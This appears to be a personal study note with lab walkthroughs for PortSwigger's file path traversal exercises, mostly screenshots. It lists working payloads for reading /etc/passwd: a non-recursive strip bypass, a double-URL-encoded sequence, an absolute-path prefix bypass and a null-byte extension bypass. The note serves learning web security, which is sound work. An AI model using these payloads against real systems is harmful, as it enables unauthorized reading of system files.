# File path traversal, simple case
![[Pasted image 20230223234206.png]]
![[Pasted image 20230223234319.png]]
![[Pasted image 20230223234343.png]]

# traversal sequences blocked with absolute path bypass
![[Pasted image 20230223235519.png]]

# traversal sequences stripped non-recursively
![[Pasted image 20230223235713.png]]
`....//....//....//etc/passwd`

# traversal sequences stripped with superfluous URL-decode
double url encode
`%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`

![[Pasted image 20230224000241.png]]

# validation of start of path

filter only checks for the begging of the file 
![[Pasted image 20230224000352.png]]
`/var/www/images/../../../../../etc/passwd `

# validation of file extension with null byte bypass
The application validates that the supplied filename ends with the expected file extension.

Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."php")

![[Pasted image 20230224000736.png]]
`../../../../../../etc/passwd%00.jpg`

---
Tags: #LFI 
Resources:
[Port Swigger](https://portswigger.net/web-security/file-path-traversal)
[PayloadOfAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder)
[[00 File Disclosure]]
[[Cheat sheet]]
